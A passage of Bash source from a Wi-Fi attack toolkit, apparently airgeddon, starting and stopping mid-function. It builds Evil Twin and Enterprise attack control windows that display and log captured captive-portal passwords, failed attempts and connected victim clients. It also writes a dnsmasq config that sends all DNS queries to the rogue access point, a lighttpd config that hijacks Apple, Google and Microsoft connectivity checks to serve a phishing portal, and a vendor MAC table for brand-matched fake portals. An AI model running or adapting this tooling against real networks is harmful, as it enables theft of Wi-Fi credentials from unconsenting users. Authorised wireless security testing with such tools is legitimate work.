			echo -e "\t${yellow_color}${enterprise_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${enterprise_texts[${language},1]}: ${normal_color}\${et_control_window_channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
			echo
			echo -e "\t${green_color}${enterprise_texts[${language},2]}${normal_color}"

			hours=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%H)
			mins=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%M)
			secs=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%S)
			echo -e "\t\${hours}:\${mins}:\${secs}"

			if [ "\${break_on_next_loop}" -eq 0 ]; then
				#shellcheck disable=SC2140
				echo -e "\t${pink_color}${control_msg}${normal_color}\n"
			fi

			echo
			if [ -z "\${last_username}" ]; then
				echo -e "\t${blue_color}${enterprise_texts[${language},6]}${normal_color}"
				echo -e "\t${blue_color}${enterprise_texts[${language},7]}${normal_color}: 0"
				echo -e "\t${blue_color}${enterprise_texts[${language},8]}${normal_color}: 0"
			else
				last_name_to_print="${blue_color}${enterprise_texts[${language},5]}:${normal_color}"
				hashes_counter_message="${blue_color}${enterprise_texts[${language},7]}:${normal_color}"
				plaintext_pass_counter_message="${blue_color}${enterprise_texts[${language},8]}:${normal_color}"
				tput el && echo -e "\t\${last_name_to_print} \${last_username}"
				echo -e "\t\${hashes_counter_message} \${hashes_counter}"
				echo -e "\t\${plaintext_pass_counter_message} \${plaintext_pass_counter}"
			fi

			if [ "\${break_on_next_loop}" -eq 1 ]; then
				kill_enterprise_windows
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&7 <<-EOF
				kill_tmux_windows "Control"
		EOF
	fi

	cat >&7 <<-EOF
				break
			fi

			if check_captured; then
				get_last_username
				set_captured_counters
			 	if [ "\${enterprise_heredoc_mode}" = "smooth" ]; then
					break_on_next_loop=1
				fi
			fi

			echo -ne "\033[K\033[u"
			sleep 0.3
			current_window_size="\$(tput cols)x\$(tput lines)"
			if [ "\${current_window_size}" != "\${stored_window_size}" ]; then
				stored_window_size="\${current_window_size}"
				clear
			fi
		done

		if [ "\${enterprise_heredoc_mode}" = "smooth" ]; then
			echo
			echo -e "\t\${log_reminder_msg}"
			echo
			echo -e "\t\${done_msg}"

			if [ "\${enterprise_heredoc_mode}" = "smooth" ]; then
				restore_interface
				save_returning_vars_to_file
			fi

			exit 0
		fi
	EOF

	exec 7>&-
	sleep 1
}

#Create here-doc bash script used for control windows on Evil Twin attacks
function set_et_control_script() {

	debug_print

	rm -rf "${tmpdir}${control_et_file}" > /dev/null 2>&1

	exec 7>"${tmpdir}${control_et_file}"

	cat >&7 <<-EOF
		#!/usr/bin/env bash

		et_heredoc_mode="${et_mode}"
		path_to_processes="${tmpdir}${et_processesfile}"
		path_to_channelfile="${tmpdir}${channelfile}"
		right_arping="${right_arping}"

		#Kill a given PID and all its subprocesses recursively
		function kill_pid_and_children_recursive() {

			local parent_pid=""
			local child_pids=""

			parent_pid="\${1}"
			child_pids=\$(pgrep -P "\${parent_pid}" 2> /dev/null)

			for child_pid in \${child_pids}; do
				kill_pid_and_children_recursive "\${child_pid}"
			done
			if [ -n "\${child_pids}" ]; then
				pkill -P "\${parent_pid}" &> /dev/null
			fi

			kill "\${parent_pid}" &> /dev/null
			wait "\${parent_pid}" 2> /dev/null
		}

		#Kill all the related processes
		function kill_et_processes_control_script() {

			readarray -t ET_PROCESSES_TO_KILL < <(cat < "\${path_to_processes}" 2> /dev/null)
			for item in "\${ET_PROCESSES_TO_KILL[@]}"; do
				kill_pid_and_children_recursive "\${item}"
			done
		}

		if [ "\${et_heredoc_mode}" = "et_captive_portal" ]; then
			attempts_path="${tmpdir}${webdir}${attemptsfile}"
			attempts_text="${blue_color}${et_misc_texts[${language},20]}:${normal_color}"
			last_password_msg="${blue_color}${et_misc_texts[${language},21]}${normal_color}"
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&7 <<-EOF
			#Function to kill tmux windows using window name
			function kill_tmux_windows() {

				local TMUX_WINDOWS_LIST=()
				local current_window_name
				readarray -t TMUX_WINDOWS_LIST < <(tmux list-windows -t "${session_name}:")
				for item in "\${TMUX_WINDOWS_LIST[@]}"; do
					[[ "\${item}" =~ ^[0-9]+:[[:blank:]](.+([^*-]))([[:blank:]]|\-|\*)[[:blank:]]?\([0-9].+ ]] && current_window_name="\${BASH_REMATCH[1]}"
					if [ "\${current_window_name}" = "${tmux_main_window}" ]; then
						continue
					fi
					if [ -n "\${1}" ]; then
						if [ "\${current_window_name}" = "\${1}" ]; then
							continue
						fi
					fi
					tmux kill-window -t "${session_name}:\${current_window_name}"
				done
			}
		EOF
	fi

	cat >&7 <<-EOF
			#Handle the finish of the Evil Twin attack
			#shellcheck disable=SC1102
			function finish_evil_twin() {

				echo "" > "${et_captive_portal_logpath}"
				date +%Y-%m-%d >> "${et_captive_portal_logpath}"
				{
				echo "${et_misc_texts[${language},19]}"
				echo ""
				echo "BSSID: ${bssid}"
				echo "${et_misc_texts[${language},1]}: ${channel}"
				echo "ESSID: ${essid}"
				echo ""
				echo "---------------"
				echo ""
				} >> "${et_captive_portal_logpath}"

				success_pass_path="${tmpdir}${webdir}${currentpassfile}"
				msg_good_pass="${et_misc_texts[${language},11]}:"
				log_path="${et_captive_portal_logpath}"
				log_reminder_msg="${pink_color}${et_misc_texts[${language},24]}: [${normal_color}${et_captive_portal_logpath}${pink_color}]${normal_color}"
				done_msg="${yellow_color}${et_misc_texts[${language},25]}${normal_color}"
				echo -e "\t${blue_color}${et_misc_texts[${language},23]}:${normal_color}"
				echo
				echo "\${msg_good_pass} \$((cat < \${success_pass_path}) 2> /dev/null)" >> "\${log_path}"
				attempts_number=\$((cat < "\${attempts_path}" | wc -l) 2> /dev/null)
				et_password=\$((cat < \${success_pass_path}) 2> /dev/null)
				echo -e "\t\${et_password}"
				echo
				echo -e "\t\${log_reminder_msg}"
				echo
				echo -e "\t\${done_msg}"

				if [ "\${attempts_number}" -gt 0 ]; then
					{
					echo ""
					echo "---------------"
					echo ""
					echo "${et_misc_texts[${language},22]}:"
					echo ""
					} >> "${et_captive_portal_logpath}"
					readarray -t BADPASSWORDS < <(cat < "${tmpdir}${webdir}${attemptsfile}" 2> /dev/null)

					for badpass in "\${BADPASSWORDS[@]}"; do
						echo "\${badpass}" >> "${et_captive_portal_logpath}"
					done
				fi

				{
				echo ""
				echo "---------------"
				echo ""
				echo "${footer_texts[${language},0]}"
				} >> "${et_captive_portal_logpath}"

				sleep 2
				kill_et_processes_control_script
	EOF

	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		cat >&7 <<-EOF
				kill_tmux_windows "Control"
		EOF
	fi

	cat >&7 <<-EOF
				exit 0
			}
		fi

		date_counter=\$(date +%s)
		while true; do
			et_control_window_channel=\$(cat "\${path_to_channelfile}" 2> /dev/null)
	EOF

	case ${et_mode} in
		"et_onlyap")
			local control_msg=${et_misc_texts[${language},4]}
		;;
		"et_sniffing"|"et_sniffing_sslstrip2")
			local control_msg=${et_misc_texts[${language},5]}
		;;
		"et_sniffing_sslstrip2_beef")
			local control_msg=${et_misc_texts[${language},27]}
		;;
		"et_captive_portal")
			local control_msg=${et_misc_texts[${language},6]}
		;;
	esac

	cat >&7 <<-EOF
			echo -e "\t${yellow_color}${et_misc_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${et_misc_texts[${language},1]}: ${normal_color}\${et_control_window_channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
			echo
			echo -e "\t${green_color}${et_misc_texts[${language},2]}${normal_color}"

			hours=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%H)
			mins=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%M)
			secs=\$(date -u --date @\$((\$(date +%s) - date_counter)) +%S)
			echo -e "\t\${hours}:\${mins}:\${secs}"
			echo -e "\t${pink_color}${control_msg}${normal_color}\n"

			if [ "\${et_heredoc_mode}" = "et_captive_portal" ]; then
				if [ -f "${tmpdir}${webdir}${et_successfile}" ]; then
					clear
					echo -e "\t${yellow_color}${et_misc_texts[${language},0]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${et_misc_texts[${language},1]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}"
					echo
					echo -e "\t${green_color}${et_misc_texts[${language},2]}${normal_color}"
					echo -e "\t\${hours}:\${mins}:\${secs}"
					echo
					finish_evil_twin
				else
					attempts_number=\$((cat < "\${attempts_path}" | wc -l) 2> /dev/null)
					last_password=\$(grep "." "\${attempts_path}" 2> /dev/null | tail -1)
					tput el && echo -ne "\t\${attempts_text} \${attempts_number}"

					if [ "\${attempts_number}" -gt 0 ]; then
						open_parenthesis="${yellow_color}(${normal_color}"
						close_parenthesis="${yellow_color})${normal_color}"
						echo -ne " \${open_parenthesis} \${last_password_msg} \${last_password} \${close_parenthesis}"
					fi
				fi
				echo
				echo
			fi

			echo -e "\t${green_color}${et_misc_texts[${language},3]}${normal_color}"
			readarray -t DHCPCLIENTS < <(grep DHCPACK < "${tmpdir}clts.txt")
			client_ips=()

			#shellcheck disable=SC2199
			if [[ -z "\${DHCPCLIENTS[@]}" ]]; then
				echo -e "\t${et_misc_texts[${language},7]}"
			else
				for client in "\${DHCPCLIENTS[@]}"; do
					[[ \${client} =~ ^DHCPACK[[:space:]]on[[:space:]]([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})[[:space:]]to[[:space:]](([a-fA-F0-9]{2}:?){5,6}).* ]] && client_ip="\${BASH_REMATCH[1]}" && client_mac="\${BASH_REMATCH[2]}"
					if [[ " \${client_ips[*]} " != *" \${client_ip} "* ]]; then
						client_hostname=""
						[[ \${client} =~ .*(\(.+\)).* ]] && client_hostname="\${BASH_REMATCH[1]}"
						if [[ -z "\${client_hostname}" ]]; then
							echo -ne "\t\${client_ip} \${client_mac}"
						else
							echo -ne "\t\${client_ip} \${client_mac} \${client_hostname}"
						fi

						if [ "\${right_arping}" -eq 1 ]; then
							if "${right_arping_command}" -C 3 -I "${interface}" -w 5 -p -q "\${client_ip}"; then
								echo -ne " ${blue_color}${et_misc_texts[${language},29]}${green_color} ✓${normal_color}"
							else
								echo -ne " ${blue_color}${et_misc_texts[${language},29]}${red_color} ✘${normal_color}"
							fi
						fi

						if [ "\${et_heredoc_mode}" = "et_captive_portal" ]; then
							if grep -qE "^\${client_ip} 200 GET /${pixelfile}" "${tmpdir}${webserver_log}" > /dev/null 2>&1; then
								echo -ne " ${blue_color}${et_misc_texts[${language},28]}${green_color} ✓${normal_color}"
							else
								echo -ne " ${blue_color}${et_misc_texts[${language},28]}${red_color} ✘${normal_color}"
							fi
						fi
						echo -ne "\n"
					fi
					client_ips+=("\${client_ip}")
				done
			fi

			echo -ne "\033[K\033[u"
			sleep 1

			current_window_size="\$(tput cols)x\$(tput lines)"
			if [ "\${current_window_size}" != "\${stored_window_size}" ]; then
				stored_window_size="\${current_window_size}"
				clear
			fi
		done
	EOF

	exec 7>&-
	sleep 1
}

#Launch dnsmasq dns black hole for captive portal Evil Twin attack
function launch_dns_blackhole() {

	debug_print

	recalculate_windows_sizes

	rm -rf "${tmpdir}${dnsmasq_file}" > /dev/null 2>&1

	{
	echo -e "interface=${interface}"
	echo -e "address=/#/${et_ip_router}"
	echo -e "port=${dns_port}"
	echo -e "bind-dynamic"
	echo -e "except-interface=${loopback_interface}"
	echo -e "address=/google.com/172.217.5.238"
	echo -e "address=/gstatic.com/172.217.5.238"
	echo -e "no-dhcp-interface=${interface}"
	echo -e "log-queries"
	echo -e "no-daemon"
	echo -e "no-resolv"
	echo -e "no-hosts"
	} >> "${tmpdir}${dnsmasq_file}"

	manage_output "+j -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"DNS\"" "${optional_tools_names[11]} -C \"${tmpdir}${dnsmasq_file}\"" "DNS"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "${optional_tools_names[11]} -C \"${tmpdir}${dnsmasq_file}\""
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi
}

#Launch control window for Enterprise attacks
function launch_enterprise_control_window() {

	debug_print

	recalculate_windows_sizes
	manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${g1_topright_window} -T \"Control\"" "bash \"${tmpdir}${control_enterprise_file}\"" "Control" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		enterprise_process_control_window=$!
	else
		get_tmux_process_id "bash \"${tmpdir}${control_enterprise_file}\""
		enterprise_process_control_window="${global_process_pid}"
		global_process_pid=""
	fi
}

#Launch control window for Evil Twin attacks
function launch_et_control_window() {

	debug_print

	recalculate_windows_sizes
	case ${et_mode} in
		"et_onlyap")
			control_scr_window_position=${g1_topright_window}
		;;
		"et_sniffing")
			control_scr_window_position=${g3_topright_window}
		;;
		"et_captive_portal")
			control_scr_window_position=${g4_topright_window}
		;;
		"et_sniffing_sslstrip2")
			control_scr_window_position=${g3_topright_window}
		;;
		"et_sniffing_sslstrip2_beef")
			control_scr_window_position=${g4_topright_window}
		;;
	esac
	manage_output "-hold -bg \"#000000\" -fg \"#FFFFFF\" -geometry ${control_scr_window_position} -T \"Control\"" "bash \"${tmpdir}${control_et_file}\"" "Control" "active"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_process_control_window=$!
	else
		get_tmux_process_id "bash \"${tmpdir}${control_et_file}\""
		et_process_control_window="${global_process_pid}"
		global_process_pid=""
	fi
}

#Create configuration file for lighttpd
function set_webserver_config() {

	debug_print

	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${webserver_log}" > /dev/null 2>&1

	{
	echo -e "server.document-root = \"${tmpdir}${webdir}\"\n"
	echo -e "server.modules = ("
	echo -e "\"mod_auth\","
	echo -e "\"mod_cgi\","
	echo -e "\"mod_redirect\","
	echo -e "\"mod_accesslog\""
	echo -e ")\n"
	echo -e "\$HTTP[\"host\"] =~ \"(.*)\" {"
	echo -e "url.redirect = ( \"^/index.htm$\" => \"/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "\$HTTP[\"host\"] =~ \"gstatic.com\" {"
	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.google.com/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "\$HTTP[\"host\"] =~ \"captive.apple.com\" {"
	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.apple.com/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "\$HTTP[\"host\"] =~ \"msftconnecttest.com\" {"
	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "\$HTTP[\"host\"] =~ \"msftncsi.com\" {"
	echo -e "url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
	echo -e "url.redirect-code = 302"
	echo -e "}"
	echo -e "server.bind = \"${et_ip_router}\""
	echo -e "server.port = ${www_port}\n"
	echo -e "index-file.names = (\"${indexfile}\")"
	echo -e "server.error-handler-404 = \"/\"\n"
	echo -e "mimetype.assign = ("
	echo -e "\".css\" => \"text/css\","
	echo -e "\".js\" => \"text/javascript\""
	echo -e ")\n"
	echo -e "cgi.assign = (\".htm\" => \"/bin/bash\")\n"
	echo -e "accesslog.filename = \"${tmpdir}${webserver_log}\""
	echo -e "accesslog.escaping = \"default\""
	echo -e "accesslog.format = \"%h %s %r %v%U %t '%{User-Agent}i'\""
	echo -e "\$HTTP[\"remote-ip\"] == \"${loopback_ip}\" { accesslog.filename = \"\" }"
	} >> "${tmpdir}${webserver_file}"

	sleep 2
}

#Prepare captive portal data based on vendor if apply
function prepare_captive_portal_data() {

	debug_print

	if [ "${advanced_captive_portal}" -eq 1 ]; then

		declare -gA cp_router_vendors=(
										["Alfa_Networks"]="00C0CA"
										["Arris"]="0000C5 0000CA 0003E0 0004BD 00080E 000B06 000CE5 000E5C 000F9F 000FCC 00111A 001180 0011AE 001225 00128A 0012C9 001311 001371 001404 00149A 0014E8 00152F 001596 00159A 0015A2 0015A3 0015A4 0015A8 0015CE 0015CF 0015D0 0015D1 001626 001675 0016B5 001700 001784 0017E2 0017EE 0018A4 0018C0 00192C 00195E 0019A6 0019C0 001A1B 001A66 001A77 001AAD 001ADB 001ADE 001B52 001BDD 001C11 001C12 001CC1 001CC3 001CFB 001D6B 001DBE 001DCD 001DCE 001DCF 001DD0 001DD1 001DD2 001DD3 001DD4 001DD5 001DD6 001E46 001E5A 001E8D 001F7E 001FC4 002040 00211E 002136 002143 002180 002210 0022B4 00230B 002374 002375 002395 0023A2 0023A3 0023AF 0023ED 0023EE 002493 002495 0024A0 0024A1 0024C1 0025F1 0025F2 002636 002641 002642 0026BA 0026D9 003676 005094 0050E3 00909C 00ACE0 00D037 00D088 00E06F 044E5A 083E0C 0CB771 0CEAC9 0CF893 1005B1 105611 10868C 109397 145BD1 14ABF0 14C03E 14CFE2 14D4FE 1820D5 1835D1 189C27 18B81F 1C1448 1C1B68 203D66 207355 20E564 20F19E 20F375 240A63 287AEE 28C87A 2C1DB8 2C584F 2C7E81 2C9569 2C9924 2C9E5F 2CA17D 306023 341FE4 347A60 384C90 386BBB 38700C 3C0461 3C36E4 3C438E 3C754A 3C7A8A 3CDFA9 400D10 402B50 404C77 407009 40B7F3 40FC89 4434A7 446AB7 44AAF5 44E137 484EFC 48D343 4C1265 4C38D8 5075F1 509551 5465DE 54E2E0 5819F8 5856E8 5C571A 5C8FE0 5CB066 5CE30E 601971 608CE6 6092F5 60D248 6402CB 641269 6455B1 64ED57 6C639C 6CA604 6CC1D2 6CCA08 704FB8 705425 707630 707E43 7085C6 70B14E 745612 748A0D 74E7C6 74EAE8 74F612 7823AE 78719C 789684 7C2634 7CBFB1 8096B1 80E540 80F503 8461A0 8496D8 84BB69 84E058 8871B1 88964E 88EF16 8C09F4 8C5A25 8C5BF0 8C61A3 8C7F3B 900DCB 901ACA 903EAB 909D7D 90B134 90C792 946269 94877C 948FCF 94CCB9 94E8C5 984B4A 986B3D 98F781 98F7D7 9C3426 9CC8FC A055DE A0687E A0C562 A41588 A47AA4 A49813 A4ED4E A811FC A8705D A897CD A89FEC A8F5DD ACB313 ACDB48 ACEC80 ACF8CC B077AC B083D6 B0935B B0DAF9 B4F2E8 B81619 BC2E48 BC644B BCCAB5 C005C2 C089AB C0A00D C0C522 C83FB4 C85261 C863FC C8AA21 CC65AD CC75E2 CC7D37 CCA462 D039B3 D0E54D D404CD D40598 D40AA9 D42C0F D43FCB D4AB82 D4B27A D82522 DC4517 E02202 E0B70A E0B7B1 E45740 E46449 E48399 E49F1E E83381 E83EFC E86D52 E8825B E8892C E8ED05 EC7097 ECA940 F0AF85 F0FCC8 F40E83 F80BBE F82DC0 F87B7A F88B37 F8A097 F8EDA5 F8F532 FC51A4 FC6FB7 FC8E7E FCAE34 DC4517 E46449 E8ED05 FCAE34"
										["Arista"]="001C73 28993A 30862D 444CA8 7483EF 985D82 AC3D94 C0D682 FC59C0 FCBD67"
										["Aruba"]="000B86 001A1E 00246C 04BD88 104F58 186472 204C03 2462CE 24DEC6 3821C7 40E3D6 64E881 6CF37F 703A0E 7C573C 84D47E 883A30 9020C2 94B40F 9C1C12 ACA31E B45D50 B83A5A B8D4E7 BC9FE4 CCD083 D015A6 D0D3E0 D8C7C8 E82689 F05C19 F42E7F F860F0"
										["Asus"]="000C6E 000EA6 00112F 0011D8 0013D4 0015F2 001731 0018F3 001A92 001BFC 001D60 001E8C 001FC6 002215 002354 00248C 002618 00E018 049226 04D4C4 04D9F5 08606E 086266 08BFB8 0C9D92 107B44 10BF48 10C37B 14DAE9 14DDA9 1831BF 1C872C 1CB72C 20CF30 244BFE 2C4D54 2C56DC 2CFDA1 305A3A 3085A9 3497F6 382C4A 38D547 40167E 40B076 485B39 4CEDFB 50465D 5404A6 54A050 6045CB 60A44C 704D7B 708BCD 74D02B 7824AF 88D7F6 90E6BA 9C5C8E A85E45 AC220B AC9E17 B06EBF BCAEC5 BCEE7B C86000 D017C2 D45D64 D850E6 E03F49 E0CB4E F07959 F46D04 F832E4 FCC233"
										["AVMFritzBox"]="2C3AFD 2C91AB 3810D5 444E6D 5C4979 7CFF4D 989BCB C80E14 CCCE1E DC396F E0286D E8DF70 F0B014"
										["Belkin"]="001150 00173F 001CDF 002275 08863B 149182 24F5A2 302303 58EF68 6038E0 94103E 944452 B4750E C05627 C4411E EC1A59"
										["CBN"]="342CC4 38437D 546751 5C353B 6802B8 905C44 AC2205 DC537C"
										["Cisco"]="00000C 000142 000143 000163 000164 000196 000197 0001C7 0001C9 000216 000217 00023D 00024A 00024B 00027D 00027E 0002B9 0002BA 0002FC 0002FD 000331 000332 00036B 00036C 00039F 0003A0 0003E3 0003E4 0003FD 0003FE 000427 000428 00044D 00044E 00046D 00046E 00049A 00049B 0004C0 0004C1 0004DD 0004DE 000500 000501 000531 000532 00055E 00055F 000573 000574 00059A 00059B 0005DC 0005DD 000628 00062A 000652 000653 00067C 0006C1 0006D6 0006D7 0006F6 00070D 00070E 00074F 000750 00077D 000784 000785 0007B3 0007B4 0007EB 0007EC 000820 000821 00082F 000830 000831 000832 00087C 00087D 0008A3 0008A4 0008C2 0008E2 0008E3 000911 000912 000943 000944 00097B 00097C 0009B6 0009B7 0009E8 0009E9 000A41 000A42 000A8A 000A8B 000AB7 000AB8 000AF3 000AF4 000B45 000B46 000B5F 000B60 000B85 000BBE 000BBF 000BFC 000BFD 000C30 000C31 000C85 000C86 000CCE 000CCF 000D28 000D29 000D65 000D66 000DBC 000DBD 000DEC 000DED 000E38 000E39 000E83 000E84 000ED6 000ED7 000F23 000F24 000F34 000F35 000F8F 000F90 000FF7 000FF8 001007 00100B 00100D 001011 001014 00101F 001029 00102F 001054 001079 00107B 0010A6 0010F6 0010FF 001120 001121 00115C 00115D 001192 001193 0011BB 0011BC 001200 001201 001243 001244 00127F 001280 0012D9 0012DA 001319 00131A 00135F 001360 00137F 001380 0013C3 0013C4 00141B 00141C 001469 00146A 0014A8 0014A9 0014F1 0014F2 00152B 00152C 001562 001563 0015C6 0015C7 0015F9 0015FA 001646 001647 00169C 00169D 0016C7 0016C8 00170E 00170F 00173B 001759 00175A 001794 001795 0017DF 0017E0 001818 001819 001873 001874 0018B9 0018BA 001906 001907 00192F 001930 001955 001956 0019A9 0019AA 0019E7 0019E8 001A2F 001A30 001A6C 001A6D 001AA1 001AA2 001AE2 001AE3 001B0C 001B0D 001B2A 001B2B 001B53 001B54 001B8F 001B90 001BD4 001BD5 001C0E 001C0F 001C57 001C58 001CB0 001CB1 001CF6 001CF9 001D45 001D46 001D70 001D71 001DA1 001DA2 001DE5 001DE6 001E13 001E14 001E49 001E4A 001E79 001E7A 001EBD 001EBE 001EF6 001EF7 001F26 001F27 001F6C 001F6D 001F9D 001F9E 001FC9 001FCA 00211B 00211C 002155 002156 0021A0 0021A1 0021D7 0021D8 00220C 00220D 002255 002256 002290 002291 0022BD 0022BE 002304 002305 002333 002334 00235D 00235E 0023AB 0023AC 0023EA 0023EB 002413 002414 002450 002451 002497 002498 0024C3 0024C4 0024F7 0024F9 002545 002546 002583 002584 0025B4 0025B5 00260A 00260B 002651 002652 002698 002699 0026CA 0026CB 00270C 00270D 002790 0027E3 0029C2 002A10 002A6A 002CC8 002F5C 003019 003024 003040 003071 003078 00307B 003080 003085 003094 003096 0030A3 0030B6 0030F2 003217 00351A 0038DF 003A7D 003A98 003A99 003A9A 003A9B 003A9C 003C10 00400B 004096 0041D2 00425A 004268 00451D 00500B 00500F 005014 00502A 00503E 005050 005053 005054 005073 005080 0050A2 0050A7 0050BD 0050D1 0050E2 0050F0 00562B 0057D2 0059DC 005D73 005F86 006009 00602F 00603E 006047 00605C 006070 006083 0062EC 006440 006BF1 006CBC 007278 007686 00778D 007888 007E95 0081C4 008731 008764 008A96 008E73 00900C 009021 00902B 00905F 00906D 00906F 009086 009092 0090A6 0090AB 0090B1 0090BF 0090D9 0090F2 009AD2 009E1E 00A289 00A2EE 00A38E 00A3D1 00A5BF 00A6CA 00A742 00AA6E 00AF1F 00B04A 00B064 00B08E 00B0C2 00B0E1 00B1E3 00B670 00B771 00B8B3 00BC60 00BE75 00BF77 00C164 00C1B1 00C88B 00CAE5 00CCFC 00D006 00D058 00D063 00D079 00D090 00D097 00D0BA 00D0BB 00D0BC 00D0C0 00D0D3 00D0E4 00D0FF 00D6FE 00D78F 00DA55 00DEFB 00E014 00E01E 00E034 00E04F 00E08F 00E0A3 00E0B0 00E0F7 00E0F9 00E0FE 00E16D 00EABD 00EBD5 00EEAB 00F28B 00F663 00F82C 00FCBA 00FD22 00FEC8 042AE2 045FB9 046273 046C9D 04C5A4 04DAD2 04EB40 04FE7F 081735 081FF3 084FA9 084FF9 0896AD 08CC68 08CCA7 08D09F 08ECF5 0C1167 0C2724 0C6803 0C75BD 0C8525 0CD0F8 0CD996 0CF5A4 1005CA 108CCF 10B3C6 10B3D5 10B3D6 10BD18 10F311 10F920 14169D 14A2A0 18339D 188090 188B45 188B9D 189C5D 18E728 18EF63 1C17D3 1C1D86 1C6A7A 1CAA07 1CDEA7 1CDF0F 1CE6C7 1CE85D 203706 203A07 204C9E 20BBC0 2401C7 24169D 247E12 24B657 24E9B3 2834A2 285261 286F7F 2893FE 28940F 28AC9E 28C7CE 2C01B5 2C0BE9 2C3124 2C3311 2C36F8 2C3ECF 2C3F38 2C4F52 2C542D 2C5741 2C5A0F 2C73A0 2C86D2 2CABEB 2CD02D 2CF89B 3037A6 308BB2 30E4DB 30F70D 346288 346F90 34A84E 34BDC8 34DBFD 34ED1B 34F8E7 380E4D 381C1A 382056 3890A5 38ED18 3C08F6 3C0E23 3C13CC 3C410E 3C510E 3C5731 3C5EC3 3CCE73 3CDF1E 40017A 405539 40A6E8 40CE24 40F4EC 4403A7 442B03 44ADD9 44D3CA 44E4D9 4C0082 4C4E35 4C710C 4C710D 4C776D 4CA64D 4CBC48 4CE175 4CE176 500604 5006AB 500F80 5017FF 501CB0 501CBF 502FA8 503DE5 5057A8 5061BF 5067AE 508789 50F722 544A00 5475D0 54781A 547C69 547FEE 5486BC 548ABA 54A274 580A20 5835D9 588D09 58971E 5897BD 58AC78 58BC27 58BFEA 58F39C 5C5015 5C5AC7 5C710D 5C838F 5CA48A 5CA62D 5CE176 5CFC66 60735C 6400F1 641225 64168D 649EF3 64A0E7 64AE0C 64D814 64D989 64E950 64F69D 682C7B 683B78 6886A7 6899CD 689CE2 68BC0C 68BDAB 68CAE4 68EFBD 6C2056 6C310E 6C410E 6C416A 6C504D 6C5E3B 6C6CD3 6C710D 6C8BD3 6C9989 6C9CED 6CAB05 6CB2AE 6CDD30 6CFA89 7001B5 700B4F 700F6A 70105C 7018A7 701F53 703509 70617B 70695A 706BB9 706D15 706E6D 70708B 7079B3 707DB9 708105 70B317 70C9C6 70CA9B 70D379 70DB98 70DF2F 70E422 70EA1A 70F096 70F35A 7426AC 74860B 7488BB 74A02F 74A2E6 7802B1 780CF0 78725D 78BAF9 78BC1A 78DA6E 7C0ECE 7C210D 7C210E 7C310E 7C69F6 7C95F3 7CAD4F 7CAD74 802DBF 80E01D 80E86F 843DC6 8478AC 84802D 848A8D 84B261 84B517 84B802 881DFC 8843E1 885A92 887556 88908D 88F031 88F077 8C604F 8CB64F 9077EE 94D469 9C4E20 9C57AD 9CAFCA 9CE176 A0239F A03D6F A0554F A09351 A0B439 A0CF5B A0E0AF A0ECF9 A0F849 A40CC3 A41875 A44C11 A4530E A45630 A46C2A A48873 A4934C A4B239 A4B439 A80C0D A89D21 A8B1D4 A8B456 AC3A67 AC4A56 AC4A67 AC7A56 AC7E8A ACA016 ACF2C5 ACF5E6 B000B4 B02680 B07D47 B08BCF B0907E B0AA77 B0FAEB B40216 B41489 B4A4E3 B4A8B9 B4DE31 B4E9B0 B83861 B8621F B8BEBF BC1665 BC16F5 BC26C7 BC4A56 BC5A56 BC671C BCC493 BCF1F2 C014FE C0255C C0626B C064E4 C067AF C07BBC C08C60 C40ACB C4143C C444A0 C46413 C471FE C47295 C47D4F C4B239 C4B36A C4B9CD C4C603 C4F7D5 C80084 C84C75 C89C1D CC167E CC46D6 CC5A53 CC70ED CC7F75 CC7F76 CC8E71 CC9070 CC9891 CCD539 CCD8C1 CCEF48 D0574C D072DC D0A5A6 D0C282 D0C789 D0D0FD D0EC35 D42C44 D46A35 D46D50 D4789B D48CB5 D4A02A D4AD71 D4ADBD D4C93C D4D748 D4E880 D824BD D867D9 D8B190 DC3979 DC7B94 DC8C37 DCA5F4 DCCEC1 DCEB94 DCF719 E00EDA E02F6D E05FB9 E0899D E0ACF1 E0D173 E4AA5D E4C722 E4D3F1 E80462 E84040 E86549 E8B748 E8BA70 E8EDF3 EC1D8B EC3091 EC4476 ECBD1D ECC882 ECE1A9 F02572 F02929 F07816 F07F06 F09E63 F0B2E5 F0F755 F40F1B F41FC2 F44E05 F47F35 F4ACC1 F4BD9E F4CFE2 F4DBE6 F4EA67 F80BCB F80F6F F84F57 F866F2 F86BD9 F872EA F87B20 F8A5C5 F8B7E2 F8C288 FC589A FC5B39 FC9947 FCFBFB"
